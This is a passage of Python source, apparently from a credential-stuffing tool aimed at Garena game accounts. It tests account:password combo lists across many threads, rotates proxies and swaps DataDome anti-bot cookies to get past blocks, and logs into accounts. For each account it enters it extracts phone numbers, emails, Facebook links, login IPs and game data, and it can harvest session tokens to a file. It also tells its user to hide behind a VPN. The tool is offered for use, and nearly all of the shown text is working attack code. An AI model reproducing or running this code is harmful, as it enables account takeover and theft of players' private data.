        _active_dashboard.print_above(card_text)
    else:
        with _dash_print_lock:
            _raw_write(card_text + '\n')
            _raw_flush()

def display_codm_info_elegant(account, password, details, codm_info, has_codm, error_reason=None, game_connections=None):
    display_codm_info(account, password, details, codm_info, has_codm, error_reason, game_connections, is_elegant=True)
_auto_remove_queue = []
_auto_remove_lock = threading.Lock()
_auto_remove_batch = 50

def _flush_auto_remove(file_manager, combo_file_path, force=False):
    with _auto_remove_lock:
        if not _auto_remove_queue:
            return
        if not force and len(_auto_remove_queue) < _auto_remove_batch:
            return
        batch = list(_auto_remove_queue)
        _auto_remove_queue.clear()
    if not batch:
        return
    target_set = set((b.strip() for b in batch))
    try:
        fp = Path(combo_file_path)
        with file_manager._file_lock:
            with open(fp, 'r', encoding='utf-8', errors='ignore') as fh:
                lines = fh.readlines()
            with open(fp, 'w', encoding='utf-8') as fh:
                for line in lines:
                    if line.strip() not in target_set:
                        fh.write(line)
    except Exception:
        pass

def _queue_auto_remove(account, password, file_manager, combo_file_path):
    with _auto_remove_lock:
        _auto_remove_queue.append(f'{account}:{password}')
    if len(_auto_remove_queue) >= _auto_remove_batch:
        threading.Thread(target=_flush_auto_remove, args=(file_manager, combo_file_path), daemon=True).start()


def get_game_connections(session, account):
    """Fetch Garena game connections for the given account.

    Returns a list of dicts: [{'game': str, 'role': str, 'region': str}, ...]
    Returns an empty list on any failure (caller treats empty as 'no games').
    """
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'referer': 'https://account.garena.com/',
            'user-agent': ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                           'AppleWebKit/537.36 (KHTML, like Gecko) '
                           'Chrome/129.0.0.0 Safari/537.36'),
        }
        cookie_parts = []
        for k in ('apple_state_key', 'datadome', 'sso_key', 'ac_session', 'session_key'):
            v = session.cookies.get(k)
            if v:
                cookie_parts.append(f'{k}={v}')
        if cookie_parts:
            headers['cookie'] = '; '.join(cookie_parts)

        resp = session.get(
            'https://account.garena.com/api/account/connections',
            headers=headers, timeout=6,
        )
        if resp.status_code != 200:
            return []
        try:
            data = resp.json()
        except json.JSONDecodeError:
            return []

        connections = []
        raw = data.get('connections') or data.get('game_connections') or []
        if isinstance(raw, list):
            for item in raw:
                if not isinstance(item, dict):
                    continue
                connections.append({
                    'game':   item.get('game') or item.get('name') or 'Unknown',
                    'role':   item.get('role') or item.get('role_name') or 'N/A',
                    'region': item.get('region') or item.get('country') or 'N/A',
                })
        return connections
    except Exception:
        return []


def save_game_folder(account, password, account_data, game_connections, base_dir):
    """Persist any non-CODM game connections into per-game txt files.

    Creates a 'Games' subdirectory under base_dir and writes one file per
    game (using GAME_FILE_MAP for filename mapping). Each line is
    'account:password | role (region)'. Safe to call when game_connections
    is empty — it will simply do nothing.
    """
    try:
        if not game_connections:
            return
        games_dir = Path(base_dir) / 'Games'
        games_dir.mkdir(parents=True, exist_ok=True)

        for gc in game_connections:
            gname = (gc.get('game') or 'Unknown').strip()
            gname_upper = gname.upper()
            if gname_upper == 'FREE FIRE':
                gname_upper = 'FREEFIRE'
            file_name = GAME_FILE_MAP.get(gname_upper)
            if not file_name:
                safe = re.sub(r'[^A-Za-z0-9_-]+', '_', gname).strip('_') or 'Unknown'
                file_name = f'{safe}.txt'

            role = gc.get('role', 'N/A')
            region = gc.get('region', 'N/A')
            line = f'{account}:{password} | {role} ({region})'
            target = games_dir / file_name
            with open(target, 'a', encoding='utf-8') as fh:
                fh.write(line + '\n')
    except Exception:
        pass


def processaccount(session, account, password, cookie_manager, datadome_manager, live_stats, results_manager, file_manager, combo_file_path, auto_remove, use_elegant_display=False, suppress_print=False, proxy_manager=None):
    max_retries = 4
    attempt = 0
    _tried_cached = False
    
    def _display(acc, pwd, det, codm, has, err=None, gc=None):
        if not suppress_print:
            (display_codm_info_elegant if use_elegant_display else display_codm_info)(acc, pwd, det, codm, has, err, gc)
    
    while True:
        attempt += 1
        try:
            datadome_manager.tick_request()
            session.cookies.clear()
            init_ga_cookies(session)
            datadome_manager.clear_session_datadome(session)
            current_datadome = datadome_manager.get_datadome()
            if current_datadome:
                datadome_manager.set_session_datadome(session, current_datadome)
            else:
                saved_ck = cookie_manager.pick_cookie()
                if saved_ck:
                    applyck(session, saved_ck)
                    val = extract_datadome_token(saved_ck)
                    if val:
                        datadome_manager.set_datadome(val)
                        datadome_manager.set_session_datadome(session, val)
                else:
                    proxy_dict = dict(session.proxies) if hasattr(session, 'proxies') and session.proxies else None
                    datadome = get_datadome_cookie(session, proxies=proxy_dict)
                    if datadome:
                        datadome_manager.set_datadome(datadome)
                        datadome_manager.set_session_datadome(session, datadome)

            v1, v2, new_datadome = prelogin(session, account, datadome_manager, cookie_manager, proxy_manager=proxy_manager)

            if v1 == 'IP_BLOCKED':
                if proxy_manager and proxy_manager.is_loaded():
                    session.proxies.clear()
                    session.proxies.update(proxy_manager.get_next())
                    if attempt <= max_retries:
                        continue
                if datadome_manager.wait_for_ip_change(session):
                    session.close()
                    session = _make_session()
                    session.cookies.clear()
                    init_ga_cookies(session)
                    datadome_manager.clear_session_datadome(session)
                    return 'IP_CHANGED'
                else:
                    live_stats.update_stats(is_error=True)
                    account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'IP Change Timeout'}
                    results_manager.add_account(account_data)
                    if auto_remove:
                        _queue_auto_remove(account, password, file_manager, combo_file_path)
                    return 'ERROR'

            if v1 == 'NETWORK_ERROR':
                if attempt < max_retries:
                    backoff = min(2 ** attempt, 30) + random.uniform(0, 2)
                    if proxy_manager and proxy_manager.is_loaded():
                        try:
                            session.proxies.clear()
                            session.proxies.update(proxy_manager.get_next())
                        except Exception:
                            pass
                    # [suppressed] network error backoff print
                    time.sleep(backoff)
                    continue
                err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Network Error'}
                live_stats.update_stats(is_error=True)
                results_manager.add_account(err_data)
                live_stats.push_result(success=False, error_reason='Network Error')
                if auto_remove:
                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                return 'ERROR'

            if v1 == 'NO_ACCOUNT':
                live_stats.update_stats(valid=False)
                account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': "error_auth"}
                results_manager.add_account(account_data)
                live_stats.push_result(success=False, error_reason="Account Doesn't Exist")
                _display(account, password, None, None, False, err="Account Doesn't Exist!")
                if auto_remove:
                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                return 'ERROR'

            if v1 == 'ERROR_AUTH':
                reason = str(v2) if v2 else 'error_auth'
                live_stats.update_stats(valid=False)
                account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': reason}
                results_manager.add_account(account_data)
                live_stats.push_result(success=False, error_reason=reason)
                _display(account, password, None, None, False, err=reason)
                if auto_remove:
                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                return 'ERROR'

            if not v1 or not v2:
                if attempt <= max_retries:
                    saved_ck = cookie_manager.pick_cookie()
                    if saved_ck:
                        applyck(session, saved_ck)
                        val = extract_datadome_token(saved_ck)
                        if val:
                            datadome_manager.set_datadome(val)
                    if proxy_manager and proxy_manager.is_loaded():
                        session.proxies.clear()
                        session.proxies.update(proxy_manager.get_next())
                    continue
                live_stats.update_stats(is_error=True)
                account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Prelogin Failed'}
                results_manager.add_account(account_data)
                live_stats.push_result(success=False, error_reason='Prelogin Failed')
                if auto_remove:
                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                return 'ERROR'

            if new_datadome:
                datadome_manager.set_datadome(new_datadome)
                datadome_manager.set_session_datadome(session, new_datadome)

            sso_key = login(session, account, password, v1, v2)
                
            if not sso_key:
                err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Invalid Credentials'}
                live_stats.update_stats(valid=False)
                results_manager.add_account(err_data)
                live_stats.push_result(success=False, error_reason='Wrong Password')
                _display(account, password, None, None, False, err='Incorrect Password')
                if auto_remove:
                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                return 'ERROR'
            
            if isinstance(sso_key, str) and sso_key.startswith('permanent_fail:'):
                reason = sso_key.split(':', 1)[1]
                err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': reason}
                live_stats.update_stats(valid=False)
                results_manager.add_account(err_data)
                _display(account, password, None, None, False, err=reason)
                if auto_remove:
                    file_manager.remove_line_from_file(combo_file_path, f'{account}:{password}')
                return 'ERROR'
            
            try:
                _sk_for_ac = session.cookies.get('session_key') or sso_key
                _capture_ac_session(session, _sk_for_ac)
            except Exception:
                pass

            _save_session_cookies(session)
            cookie_parts = [f'{k}={session.cookies.get(k)}' for k in ['apple_state_key', 'datadome', 'sso_key', 'ac_session', 'session_key', '_ga', '_ga_XB5PSHEQB4', '_ga_1M7M9L6VPX'] if session.cookies.get(k)]
            cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
            
            headers = {'accept': '*/*', 'referer': 'https://account.garena.com/', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'}
            if cookie_header:
                headers['cookie'] = cookie_header
            
            response = session.get('https://account.garena.com/api/account/init', headers=headers, timeout=6)
            
            if response.status_code == 403:
                bad_cookie = session.cookies.get('datadome') or datadome_manager.get_datadome()
                if bad_cookie:
                    cookie_manager.mark_banned(bad_cookie)
                if proxy_manager and proxy_manager.is_loaded():
                    _cur_proxy = session.proxies.get('http') or session.proxies.get('https')
                    if _cur_proxy:
                        proxy_manager.report_failure(_cur_proxy, is_403=True)
                if datadome_manager.handle_403(session):
                    if attempt < max_retries:
                        backoff = min(2 ** attempt, 60) + random.uniform(0, 3)
                        # [suppressed] 403 backoff print
                        time.sleep(backoff)
                        continue
                err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Cookie Banned/IP Blocked'}
                live_stats.update_stats(is_error=True)
                results_manager.add_account(err_data)
                if auto_remove:
                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                return 'ERROR'
            
            try:
                account_data_json = response.json()
            except json.JSONDecodeError:
                if attempt < max_retries:
                    # [suppressed] invalid response retry print
                    time.sleep(0.2)
                    continue
                err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Invalid Server Response'}
                live_stats.update_stats(is_error=True)
                results_manager.add_account(err_data)
                if auto_remove:
                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                return 'ERROR'
            
            if 'error_auth' in account_data_json:
                err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Incorrect Password'}
                live_stats.update_stats(valid=False)
                results_manager.add_account(err_data)
                _display(account, password, None, None, False, err='Incorrect Password')
                if auto_remove:
                    _queue_auto_remove(account, password, file_manager, combo_file_path)
                return 'ERROR'
            
            if 'error' in account_data_json:
                error_msg = account_data_json.get('error')
                if error_msg == 'ACCOUNT DOESNT EXIST':
                    err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': "Account Doesn't Exist"}
                    live_stats.update_stats(valid=False)
                    results_manager.add_account(err_data)
                    _display(account, password, None, None, False, err="Account Doesn't Exist!")
                    if auto_remove:
                        file_manager.remove_line_from_file(combo_file_path, f'{account}:{password}')
                    return 'ERROR'
                else:
                    err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': error_msg}
                    live_stats.update_stats(is_error=True)
                    results_manager.add_account(err_data)
                    _display(account, password, None, None, False, err=error_msg)
                    if auto_remove:
                        file_manager.remove_line_from_file(combo_file_path, f'{account}:{password}')
                    return 'ERROR'
            
            if 'user_info' in account_data_json:
                details = parse_account_details(account_data_json)
                details['login_history'] = account_data_json.get('login_history', [])
            else:
                details = parse_account_details({'user_info': account_data_json})
            
            # Run CODM check + game connections in parallel to save ~300ms
            # per account. With 150 threads × 300ms = 45s saved per 100 accounts.
            game_connections = []
            has_codm = False
            codm_info = {}
            
            from concurrent.futures import ThreadPoolExecutor as _TPE
            with _TPE(max_workers=2) as _inner_ex:
                # CODM check (uses a fresh session to avoid cookie bleed)
                def _do_codm():
                    cs = requests.Session()
                    for cn in ['sso_key', 'apple_state_key', 'datadome']:
                        if cn in session.cookies:
                            cs.cookies.set(cn, session.cookies.get(cn), domain='.garena.com')
                    try:
                        return check_codm_account(cs, account)
                    finally:
                        cs.close()
                
                codm_fut = _inner_ex.submit(_do_codm)
                
                # Game connections (only if enabled)
                games_fut = None
                if CHECK_OTHER_GAMES:
                    games_fut = _inner_ex.submit(get_game_connections, session, account)
                
                try:
                    has_codm, codm_info = codm_fut.result(timeout=8)
                except Exception:
                    has_codm, codm_info = False, {}
                
                if games_fut is not None:
                    try:
                        game_connections = games_fut.result(timeout=5) or []
                        # [suppressed] game connections found print
                    except Exception as _ge:
                        # [suppressed] game check error print
                        game_connections = []
            
            fresh_datadome = datadome_manager.extract_datadome_from_session(session)
            if fresh_datadome:
                cookie_manager.save_cookie(fresh_datadome)
            
            mobile_no = details['personal'].get('mobile_no', 'N/A')
            country_code = details['personal'].get('country_code', 'N/A')
            formatted_mobile = format_mobile_number(mobile_no, country_code)
            
            email = details.get('email', 'N/A')
            email_verified = details.get('email_verified', False)
            if email and email != 'N/A' and ('@' in email):
                email_display = f'{email} {"(Verified)" if email_verified else "(Not Verified)"}'
            else:
                email_display = 'N/A'
            
            fb_username = details['facebook'].get('fb_username', 'N/A')
            fb_uid = details['facebook'].get('fb_uid', 'N/A')
            fb_link = f'https://www.facebook.com/profile.php?id={fb_uid}' if fb_uid != 'N/A' and fb_uid else 'N/A'
            
            if fb_uid == 'N/A' or not fb_uid:
                fb_info = 'NOT CONNECTED'
            elif not fb_username or fb_username == 'N/A':
                fb_info = 'FB UNBIND or FB DELETED'
            else:
                fb_info = 'CONNECTED'
            
            login_history = details.get('login_history', [])
            last_login_info = login_history[0] if login_history else {}
            last_login = last_login_info.get('timestamp', 0)
            last_login_date = time.strftime('%B %d, %Y | %I:%M %p', time.localtime(last_login)) if last_login else 'N/A'
            last_login_where = f"{last_login_info.get('source', 'Unknown')}" if last_login_info else 'Unknown'
            last_login_ip = last_login_info.get('ip', 'N/A') if last_login_info else 'N/A'
            last_login_country = last_login_info.get('country', 'N/A') if last_login_info else 'N/A'
            
            shell_balance = details['profile'].get('shell_balance', 0)
            
            account_data = {
                'account': account,
                'password': password,
                'uid': details.get('uid', 'N/A'),
                'username': details.get('username', 'N/A'),
                'nickname': details.get('nickname', 'N/A'),
                'email': details.get('email', 'N/A'),
                'email_display': email_display,
                'formatted_mobile': formatted_mobile,
                'country': details['personal'].get('country', 'N/A'),
                'shell_balance': shell_balance,
                'account_status': details['status'].get('account_status', 'N/A'),
                'fb_username': fb_username,
                'fb_uid': fb_uid,
                'fb_link': fb_link,
                'fb_info': fb_info,
                'bind_status': details.get('bind_status', 'N/A'),
                'is_clean': details.get('is_clean', False),
                'has_codm': has_codm,
                'is_error': False,
                'last_login_date': last_login_date,
                'last_login_where': last_login_where,
                'last_login_ip': last_login_ip,
                'last_login_country': last_login_country,
                'game_connections': game_connections
            }
            
            if has_codm and codm_info:
                account_data.update({
                    'codm_level': int(codm_info.get('codm_level', 0)),
                    'codm_region': codm_info.get('region', 'N/A'),
                    'codm_nickname': codm_info.get('codm_nickname', 'N/A'),
                    'codm_uid': codm_info.get('uid', 'N/A'),
                    'region_code': codm_info.get('region_code', 'N/A')
                })
            else:
                account_data.update({
                    'codm_level': 0,
                    'codm_region': 'N/A',
                    'codm_nickname': 'N/A',
                    'codm_uid': 'N/A',
                    'region_code': 'N/A'
                })
            
            results_manager.add_account(account_data)
            if proxy_manager and proxy_manager.is_loaded():
                _cur_proxy = session.proxies.get('http') or session.proxies.get('https')
                if _cur_proxy:
                    proxy_manager.report_success(_cur_proxy)
            
            codm_level = account_data.get('codm_level', 0)
            live_stats.update_stats(
                valid=True,
                clean=details['is_clean'],
                has_codm=has_codm,
                codm_level=codm_level,
                game_connections=game_connections,
                shell=shell_balance
            )
            live_stats.push_result(
                success=True,
                is_clean=details['is_clean'],
                has_codm=has_codm,
                codm_level=codm_level,
                shell_balance=shell_balance
            )
            
            if CHECK_OTHER_GAMES and game_connections:
                save_game_folder(account, password, account_data, game_connections, results_manager.base_dir)
            
            _display(account, password, details, codm_info, has_codm, gc=game_connections)

            if HARVEST_COOKIES:
                try:
                    wanted_keys = ['datadome', 'sso_key', 'token_session', 'ac_session', 'session_key']
                    found_cookies = {}
                    for cookie in session.cookies:
                        if cookie.name in wanted_keys and cookie.name not in found_cookies:
                            found_cookies[cookie.name] = cookie.value
                    if found_cookies:
                        c_str = "; ".join([f"{k}={v}" for k, v in found_cookies.items()])
                        with open("fetch_cookie.txt", "a", encoding="utf-8") as scf:
                            scf.write(c_str + "\n")
                except Exception:
                    pass

            if auto_remove:
                file_manager.remove_line_from_file(combo_file_path, f'{account}:{password}')
            
            return 'DONE'
            
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
            if attempt < max_retries:
                backoff = min(2 ** attempt, 60) + random.uniform(0, 2)
                # [suppressed] connection/timeout backoff print
                time.sleep(backoff)
                continue
            err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Connection/Timeout Error'}
            live_stats.update_stats(is_error=True)
            results_manager.add_account(err_data)
            if auto_remove:
                _queue_auto_remove(account, password, file_manager, combo_file_path)
            return 'ERROR'
            
        except Exception as e:
            if attempt < max_retries:
                time.sleep(0.2)
                continue
            logger.error(f'[ERROR] Unexpected error processing {account}')
            err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': f'Unexpected Error: {str(e)}'}
            live_stats.update_stats(is_error=True)
            results_manager.add_account(err_data)
            if auto_remove:
                _queue_auto_remove(account, password, file_manager, combo_file_path)
            return 'ERROR'

def _prelogin_no_ip_wait(session, account, datadome_manager, max_retries=6):
    url = 'https://sso.garena.com/api/prelogin'
    for attempt in range(max_retries):
        try:
            params = {'app_id': '10100', 'account': account, 'format': 'json', 'id': str(int(time.time() * 1000))}
            current_cookies = session.cookies.get_dict()
            cookie_parts = [f'{n}={current_cookies[n]}' for n in ('apple_state_key', 'datadome', 'sso_key') if n in current_cookies]
            headers = {
                'accept': 'application/json, text/plain, */*',
                'accept-encoding': 'gzip, deflate, br, zstd',
                'accept-language': 'en-US,en;q=0.9',
                'connection': 'keep-alive',
                'host': 'sso.garena.com',
                'referer': f'https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=en-SG&account={account}',
                'sec-ch-ua': '"Google Chrome";v="133", "Chromium";v="133", "Not=A?Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'
            }
            if cookie_parts:
                headers['cookie'] = '; '.join(cookie_parts)
            resp = session.get(url, headers=headers, params=params, timeout=5)
            new_dd = resp.cookies.get('datadome')
            if new_dd:
                session.cookies.set('datadome', new_dd, domain='.garena.com')
                datadome_manager.set_datadome(new_dd)
            if resp.status_code == 403:
                fresh = get_datadome_cookie(session)
                if fresh:
                    datadome_manager.set_datadome(fresh)
                    datadome_manager.set_session_datadome(session, fresh)
                    continue
                return (None, None, None)
            if resp.status_code == 429:
                # rate-limited: swap in a fresh datadome token so the retry isn't throttled
                fresh = get_datadome_cookie(session)
                if fresh:
                    datadome_manager.set_datadome(fresh)
                    datadome_manager.set_session_datadome(session, fresh)
                continue
            resp.raise_for_status()
            if _is_fake_response(resp):
                fresh = get_datadome_cookie(session)
                if fresh:
                    datadome_manager.set_datadome(fresh)
                    datadome_manager.set_session_datadome(session, fresh)
                continue
            try:
                data = resp.json()
            except Exception:
                continue
            if 'error' in data:
                err = data['error']
                if err == 'error_no_account':
                    return ('NO_ACCOUNT', None, new_dd)
                elif err in ('error_auth', 'error_user_ban', 'error_security_ban'):
                    return ('ERROR_AUTH', err, new_dd)
                continue
            v1 = data.get('v1')
            v2 = data.get('v2')
            if not v1 or not v2:
                continue
            return (v1, v2, new_dd)
        except Exception:
            continue
    return (None, None, None)

def validator_check():
    clear_screen()
    display_banner()
    console = Console()
    
    console.print(Panel(Text("⚠  SECURITY NOTICE", style="bold bright_red") + Text(" — USE A VPN BEFORE VALIDATING", style="bright_white"), border_style="bright_red", box=box.ROUNDED, expand=False))
    print()
    console.print(Panel(Text("⬡  VALIDATOR MODE", style="bold bright_white"), border_style="bright_yellow", box=box.ROUNDED, expand=False))
    print()
    
    file_manager = AccountFileManager()
    combo_files = file_manager.scan_combo_folder()
    if not combo_files:
        _log('ERROR', 'No .txt files found in Combo folder.')
        input(f'\n  {_DIM}Press Enter to return to menu{_RST} ')
        return
    
    file_viewer = AccountFileViewer()
    file_infos = [info for fp in combo_files for info in [file_manager.get_file_info(fp)] if info]
    if not file_infos:
        _log('ERROR', 'No valid combo files.')
        input(f'\n  {_DIM}Press Enter to return to menu{_RST} ')
        return
    
    file_viewer.display_file_table(file_infos)
    selected_file = file_viewer.prompt_file_selection(file_infos)
    
    accounts = []
    with open(selected_file, 'r', encoding='utf-8', errors='ignore') as fh:
        for line in fh:
            acc, pw = clean_account_line(line)
            if acc and pw:
                accounts.append((acc, pw))
    
    if not accounts:
        _log('ERROR', 'No valid account:password lines found.')
        input(f'\n  {_DIM}Press Enter to return to menu{_RST} ')
        return
    
    console.print(Panel(Text(f"Loaded {len(accounts):,} combos", style="bold bright_white"), border_style="bright_green", box=box.ROUNDED, expand=False))
    print()
    
    console.print(Panel(Text("Select Thread Count", style="bold bright_white"), border_style="#ffd750", box=box.ROUNDED, expand=False))
    
    while True:
        try:
            raw_t = input(f'  {_CY}❯ Threads 1-100 {_DIM}(default {DEFAULT_THREADS}){_RST}  {_CY}❯{_RST} ').strip()
            num_threads = int(raw_t) if raw_t else DEFAULT_THREADS
            if 1 <= num_threads <= 100:
                break
            _log('ERROR', 'Enter a value between 1 and 100.')
        except ValueError:
            _log('ERROR', 'Invalid input — enter a number.')
    
    _log('SUCCESS', f'Running with [bold]{num_threads}[/bold] thread(s)')
    print()
    
    stem = Path(selected_file).stem
    ts_str = datetime.now().strftime('%Y%m%d_%H%M%S')
    out_dir = Path('Results') / f'validator_{stem}_{ts_str}'
    out_dir.mkdir(parents=True, exist_ok=True)
    
    valid_path = out_dir / 'valid.txt'
    invalid_path = out_dir / 'invalid.txt'
    error_path = out_dir / 'errors.txt'
    
    valid_fh = open(valid_path, 'a', encoding='utf-8', buffering=1)
    invalid_fh = open(invalid_path, 'a', encoding='utf-8', buffering=1)
    error_fh = open(error_path, 'a', encoding='utf-8', buffering=1)
    
    vl = {'valid': 0, 'invalid': 0, 'error': 0, 'done': 0}
    st_lock = threading.Lock()
    file_lock = threading.Lock()
    stop_ev = threading.Event()
    print_lock = threading.Lock()
    start_time = time.time()
    total = len(accounts)
    cookie_manager_val = CookieManager()
    _tl = threading.local()
    global _PROXIES_ACTIVE
    _PROXIES_ACTIVE = False

    def _get_sess():
        if not hasattr(_tl, 's'):
            s = _make_session()
            dm = DataDomeManager()
            picked_ck = cookie_manager_val.pick_cookie()
            if picked_ck:
                applyck(s, picked_ck)
                dd = extract_datadome_token(picked_ck)
                if dd:
                    dm.set_datadome(dd)
                    dm.set_session_datadome(s, dd)
            else:
                proxy_dict = dict(s.proxies) if hasattr(s, 'proxies') and s.proxies else None
                dd = get_datadome_cookie(s, proxies=proxy_dict)
                if dd:
                    dm.set_datadome(dd)
                    dm.set_session_datadome(s, dd)
            _tl.s = s
            _tl.dm = dm
        return (_tl.s, _tl.dm)

    def _print_line(tag, account, password, note=''):
        with print_lock:
            if tag == 'valid':
                console.print(f"  [bold bright_green]VALID  [/bold bright_green]  [bright_white]{account}:{password}[/bright_white]")
            else:
                reason = note.upper() if note else 'INCORRECT PASSWORD' if tag == 'invalid' else 'UNKNOWN ERROR'
                color = "bold bright_red" if tag == 'invalid' else "dim"
                console.print(f"  [{color}]INVALID[/{color}]  [dim]{account}:{password}[/dim]  [dim]{reason}[/dim]")

    def _print_live_stats():
        with st_lock:
            v = vl['valid']; iv = vl['invalid']; er = vl['error']; dn = vl['done']
        elapsed = max(time.time() - start_time, 0.001)
        rate = dn / elapsed
        eta = (total - dn) / rate if rate > 0 else 0
        pct = dn / total * 100 if total > 0 else 0
        bar_w = 20
        filled = int(pct / 100 * bar_w)
        with print_lock:
            console.print()
            console.print(Panel(
                f"[#ffd750]{'█' * filled}{'░' * (bar_w - filled)}[/#ffd750]  [bold bright_yellow]{pct:.1f}%[/bold bright_yellow]  [dim]{dn}/{total}  ·  {rate:.1f}/s  ·  ETA {int(eta // 60)}m{int(eta % 60):02d}s[/dim]",
                border_style="#ffd750", box=box.ROUNDED, padding=(0, 1), expand=False
            ))
            console.print()

    def _check_one(acc_pw):
        if stop_ev.is_set():
            return
        account, password = acc_pw
        result = 'error'; note = ''
        try:
            session, dm = _get_sess()
            v1, v2, _ = _prelogin_no_ip_wait(session, account, dm)
            if v1 == 'NO_ACCOUNT':
                result = 'invalid'
                note = 'Account Not Found'
            elif v1 == 'ERROR_AUTH':
                result = 'invalid'
                note = str(v2) if v2 else 'error_auth'
            elif not v1 or not v2:
                result = 'error'
                note = 'Prelogin Failed'
            else:
                sso_key = login(session, account, password, v1, v2)
                if sso_key and not (isinstance(sso_key, str) and sso_key.startswith('permanent_fail:')):
                    result = 'valid'
                    note = ''
                else:
                    result = 'invalid'
                    note = 'Incorrect Password'
        except Exception as e:
            result = 'error'; note = type(e).__name__
        with file_lock:
            if result == 'valid':
                valid_fh.write(f'{account}:{password}\n')
            elif result == 'invalid':
                invalid_fh.write(f'{account}:{password}\n')
            else:
                error_fh.write(f'{account}:{password}  | {note}\n')
        with st_lock:
            vl[result] += 1
            vl['done'] += 1
            done_now = vl['done']
        _print_line(result, account, password, note)
        if done_now % 5 == 0 or done_now == total:
            _print_live_stats()
    
    console.print(Panel(Text(f"Output: {out_dir}", style="#ffd750"), border_style="#ffd750", box=box.ROUNDED, expand=False))
    print()
    
    try:
        with ThreadPoolExecutor(max_workers=num_threads) as ex:
            futs = {ex.submit(_check_one, ap): ap for ap in accounts}
            for fut in as_completed(futs):
                if stop_ev.is_set():
                    break
                try:
                    fut.result(timeout=8)
                except Exception:
                    pass
    except KeyboardInterrupt:
        stop_ev.set()
        _log('WARNING', 'Stopping — flushing results…')
    finally:
        valid_fh.close(); invalid_fh.close(); error_fh.close()
    
    elapsed = max(time.time() - start_time, 0.001)
    with st_lock:
        v = vl['valid']; iv = vl['invalid']; er = vl['error']; dn = vl['done']

    def _rich_bar(cnt, denom, color, bw=20):
        if denom == 0:
            return f"[dim]{'░' * bw}[/dim]"
        f2 = int(cnt / denom * bw)
        return f"[{color}]{'█' * f2}[/{color}][dim]{'░' * (bw - f2)}[/dim]"
    
    results_table = Table(title="[bold bright_yellow]⬡  VALIDATOR COMPLETE[/bold bright_yellow]", box=box.HEAVY, border_style="bright_yellow", show_header=True, header_style="bold dim", padding=(0, 2), expand=False)
    results_table.add_column("Category", style="dim", no_wrap=True, width=14)
    results_table.add_column("Count", justify="right", style="bright_white", width=10)
    results_table.add_column("Pct", justify="right", style="bright_yellow", width=8)
    results_table.add_column("Bar", no_wrap=True)
    
    for label, cnt, color in [('✔  Valid', v, "bright_green"), ('✖  Invalid', iv, "bright_red"), ('·  Errors', er, "dim")]:
        pct_s = f'{cnt / total * 100:.1f}%' if total else '0.0%'
        results_table.add_row(f"[{color}]{label}[/{color}]", f"[{color}]{cnt:,}[/{color}]", pct_s, _rich_bar(cnt, total, color))
    
    console.print(results_table)
    print()
    
    stats_panel = Panel(
        Text(f"⏱  Time     {int(elapsed // 60)}m {int(elapsed % 60)}s\n", style="dim") +
        Text(f"⚡  Rate     {dn / elapsed:.2f} acc/s\n", style="dim") +
        Text(f"◈  Processed {dn:,}/{total:,}\n", style="dim") +
        Text(f"✔  Valid    {valid_path}\n", style="#ffd750") +
        Text(f"✖  Invalid  {invalid_path}\n", style="#ffd750") +
        Text(f"·  Errors   {error_path}\n", style="#ffd750") +
        Text("◈  Powered by @dvlist", style="bold #ffd750"),
        border_style="#ffaa00", box=box.ROUNDED, expand=False
    )
    console.print(stats_panel)
    print()
    input(f'  {_DIM}↵ menu{_RST} ')

def prompt_proxy_setup():
    global proxy_manager
    indent = "    "
    clear_screen()
    display_banner()

    def _header(title, subtitle=None):
        console.print(Panel(
            Text(title, style="bold bright_white") if not subtitle
            else Text(title, style="bold bright_white") + Text(f"\n{subtitle}", style="dim"),
            border_style="#ffaa00", box=box.ROUNDED, expand=False
        ))
        print()

    def _panel(content, border="#ffd750"):
        console.print(Panel(content, border_style=border, box=box.ROUNDED, expand=False))
        print()

    def _ok(msg):   console.print(indent + f"[bold green]  ✔ {msg}[/bold green]")
    def _warn(msg): console.print(indent + f"[bold yellow]  ⚠ {msg}[/bold yellow]")
    def _err(msg):  console.print(indent + f"[bold red]  ✖ {msg}[/bold red]")
    def _info(msg): console.print(indent + f"  [bold #ffd750]{msg}[/bold #ffd750]")
    def _ask(prompt, color="bold #ffaa00"):
        return console.input(indent + f"[{color}]  ▸ {prompt}[/{color}]").strip()

    _header("PROXY CONFIGURATION", "Configure how requests are routed")

    mode_text = (
        Text("  [1]  ", style="bold #ffaa00") + Text("Custom URL", style="bold white") +
        Text("   – Single proxy, enter manually\n", style="dim") +
        Text("  [2]  ", style="bold #ffaa00") + Text("Proxy File", style="bold white") +
        Text("   – Load multiple proxies from a file\n", style="dim") +
        Text("  [3]  ", style="bold #ffaa00") + Text("No Proxy  ", style="bold white") +
        Text("   – Direct connection, no routing", style="dim")
    )
    _panel(mode_text)

    while True:
